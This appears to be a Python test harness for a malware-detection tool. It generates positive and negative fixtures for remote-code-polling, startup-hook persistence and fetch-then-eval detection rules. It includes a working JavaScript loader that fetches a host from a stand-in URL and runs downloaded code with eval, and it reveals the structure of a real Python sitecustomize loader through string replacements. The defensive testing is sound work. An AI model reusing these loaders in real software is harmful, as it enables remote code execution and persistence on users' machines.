#!/usr/bin/env python3
"""Build and verify callback/hostname flow controls in cleave's fixtures."""
import argparse
import json
from pathlib import Path
import subprocess

p = argparse.ArgumentParser()
p.add_argument('--evidence', type=Path, required=True)
p.add_argument('--fixtures', type=Path, required=True)
p.add_argument('--report', type=Path, required=True)
p.add_argument('--cleave', default='cleave')
a = p.parse_args()
root = Path(__file__).resolve().parents[2]
poll = 'objectives/command-and-control/remote-command/http-poll::python-threadpool-http-exec-poll'
daemon = 'objectives/command-and-control/remote-command/http-poll::python-threadpool-http-exec-daemon'
startup = 'objectives/persistence/system/python-startup::startup-hook-threadpool-code-daemon'
host = 'micro-behaviors/communications/http/url/build::js-fetch-response-host-indirection'
execute = 'objectives/execution/payload/script-eval::js-indirected-http-response-eval'
new = {poll, daemon, startup, host, execute}
cases = {}


def case(name, source, required=(), forbidden=()):
    target = a.fixtures / name
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(source)
    cases[name] = (set(required), set(forbidden))


# Keep the loader and remove only the separate embedded collector statement.
# None of this code is imported or executed by the runner.
original = (a.evidence / 'sitecustomize.py').read_text()
loader = '\n'.join(line for line in original.splitlines() if len(line) < 10000) + '\n'
case('positive/sitecustomize.py', loader, {poll, daemon, startup})
case('positive/usercustomize.py', loader, {poll, daemon, startup})
case('standalone.py', loader, {poll, daemon}, {startup})
renamed = loader
for before, after in [('_fetch_once', '_retrieve'), ('fetch_text', 'read_stage'),
                      ('exec_code', 'activate'), ('resolve_domain', 'lookup'),
                      ('GITHUB_RAW_URL', 'ROUTING_SOURCE'), ('CODE_PATH', 'RESOURCE'),
                      ('LOOP_INTERVAL', 'DELAY'), ('requests', 'httpx'),
                      ('letters9813/pythonclient-test/main/domain.txt', 'example/routing/main/host.txt'),
                      ('/codepy', '/stage'), ('remote_code_loader.lock', 'worker.lock'),
                      ('3600', '719')]:
    renamed = renamed.replace(before, after)
case('renamed.py', renamed, {poll, daemon}, {startup})
case('foreground.py', loader.replace('os.fork()', '0'), {poll}, {daemon, startup})
case('response_overwritten.py', loader.replace('return resp.text', 'resp = local_response\n    return resp.text'), forbidden=new)
case('code_overwritten.py', loader.replace('await exec_code(code)', 'code = "pass"\n    await exec_code(code)'), forbidden=new)
case('other_value.py', loader.replace('await exec_code(code)', 'await exec_code(local_source)'), forbidden=new)
case('other_fetch.py', loader.replace('code = await fetch_text(', 'code = await local_text('), forbidden=new)
case('other_callback.py', loader.replace('_executor, _fetch_once, url', '_executor, local_text, url'), forbidden=new)
case('other_parameter.py', loader.replace('_executor, _fetch_once, url', '_executor, _fetch_once, local_url'), forbidden=new)
case('other_response.py', loader.replace('return resp.text', 'return local_response.text'), forbidden=new)
case('other_client.py', loader.replace('requests.get(', 'storage.get('), forbidden=new)
case('compile_only.py', loader.replace('lambda: exec(compile(code, "<remote>", "exec"), {"__name__": "__main__"})', 'lambda: compile(code, "<remote>", "exec")'), forbidden=new)
case('other_compiled.py', loader.replace('compile(code,', 'compile(local_source,'), forbidden=new)
case('other_mode.py', loader.replace('"<remote>", "exec"', '"<remote>", "eval"'), forbidden=new)
case('other_poll.py', loader.replace('asyncio.run(run())', 'asyncio.run(local_step())'), forbidden=new)
case('no_poll.py', loader.replace('while True:', 'while False:'), forbidden=new)
case('quoted.py', 'description = ' + repr(loader) + '\n', forbidden=new)
case('comments.py', '\n'.join('# ' + line for line in loader.splitlines()), forbidden=new)

js = '''async function check() {
  const gateway = await (await fetch("https://raw.githubusercontent.com/example/routing/main/host.txt")).text();
  const source = await (await fetch(`http://${gateway}/stage`)).text();
  eval(source);
}
setInterval(check, 3600000);
check();
'''
for ext in ('js', 'ts'):
    case('loader.' + ext, js, {host, execute})
    case('renamed.' + ext, js.replace('gateway', 'endpoint').replace('source', 'payload').replace('/stage', '/next').replace('http://', 'https://'), {host, execute})
    case('config_only.' + ext, js.replace('eval(source)', 'console.log(source)'), {host}, {execute})
    case('unrelated_host.' + ext, js.replace('${gateway}', '${localHost}'), forbidden=new)
    case('host_overwritten.' + ext, js.replace('  const source', '  gateway = "local.invalid";\n  const source'), forbidden=new)
    case('code_overwritten.' + ext, js.replace('  eval(source)', '  source = "1+1";\n  eval(source)'), {host}, {execute})
    case('other_body.' + ext, js.replace('eval(source)', 'eval(localCode)'), {host}, {execute})
    case('path_only.' + ext, js.replace('`http://${gateway}/stage`', '`https://updates.invalid/${gateway}/stage`'), forbidden=new)
    case('local_reader.' + ext, js.replace('fetch(', 'readLocal('), forbidden=new)
    case('comments.' + ext, '\n'.join('// ' + line for line in js.splitlines()), forbidden=new)
    case('quoted.' + ext, 'const description = ' + json.dumps(js) + ';\n', forbidden=new)

subprocess.run([a.cleave, '--traits-dir', str(root), '--format', 'json',
                'analyze', str(a.fixtures), '-o', str(a.report)], check=True)
text = a.report.read_text()
found = {}
while text.strip():
    result, end = json.JSONDecoder().raw_decode(text.lstrip())
    text = text.lstrip()[end:]
    for f in result['files']:
        name = str(Path(f['path']).relative_to(a.fixtures))
        found[name] = {t['id'] for t in f.get('traits', [])}
for name, (required, forbidden) in cases.items():
    missing, extra = required - found[name], forbidden & found[name]
    assert not missing and not extra, (name, sorted(missing), sorted(extra))
print(f'{len(cases)} focused cases passed')
